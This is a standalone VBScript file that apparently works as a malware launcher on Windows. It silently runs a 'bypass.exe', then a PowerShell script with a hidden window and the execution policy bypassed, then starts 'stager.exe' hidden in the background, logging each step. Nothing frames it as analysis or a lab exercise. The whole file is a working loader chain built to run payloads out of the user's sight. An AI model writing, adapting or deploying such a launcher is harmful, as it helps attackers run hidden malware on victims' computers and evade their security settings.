Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

scriptPath = fso.GetParentFolderName(WScript.ScriptFullName)

' Create a log file for debugging
Set logFile = fso.CreateTextFile(scriptPath & "\debug.log", True)
logFile.WriteLine "VBS script started at " & Now()

' Step 1: Run bypass.exe and wait
bypassPath = scriptPath & "\bypass.exe"
If fso.FileExists(bypassPath) Then
    logFile.WriteLine "Running bypass.exe"
    result = shell.Run(Chr(34) & bypassPath & Chr(34), 0, True)
    logFile.WriteLine "bypass.exe completed with exit code: " & result
    
    ' Wait 10 seconds after successful completion of bypass.exe
    If result = 0 Then
        logFile.WriteLine "Waiting 10 seconds before proceeding..."
        WScript.Sleep 10000
    End If
Else
    logFile.WriteLine "bypass.exe not found"
End If

' Step 2: Run the existing open.ps1 file BEFORE stager.exe
openPsPath = scriptPath & "\open.ps1"
If fso.FileExists(openPsPath) Then
    logFile.WriteLine "Found open.ps1, attempting to execute"
    
    ' Run PowerShell directly
    command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File " & Chr(34) & openPsPath & Chr(34)
    logFile.WriteLine "Command: " & command
    
    result = shell.Run(command, 0, True)
    logFile.WriteLine "PowerShell execution completed with exit code: " & result
    
    If result = 0 Then
        logFile.WriteLine "PowerShell script executed successfully"
    Else
        logFile.WriteLine "PowerShell script failed with exit code: " & result
    End If
Else
    logFile.WriteLine "open.ps1 not found"
End If

' Step 3: Run stager.exe in background (don't wait for completion)
stagerPath = scriptPath & "\stager.exe"
If fso.FileExists(stagerPath) Then
    logFile.WriteLine "Running stager.exe in background"
    
    ' Run stager.exe in hidden mode without waiting
    shell.Run Chr(34) & stagerPath & Chr(34), 0, False
    
    logFile.WriteLine "Stager.exe started in background (not waiting for completion)"
Else
    logFile.WriteLine "stager.exe not found"
End If

logFile.WriteLine "VBS script completed at " & Now()
logFile.Close

Set fso = Nothing
Set shell = Nothing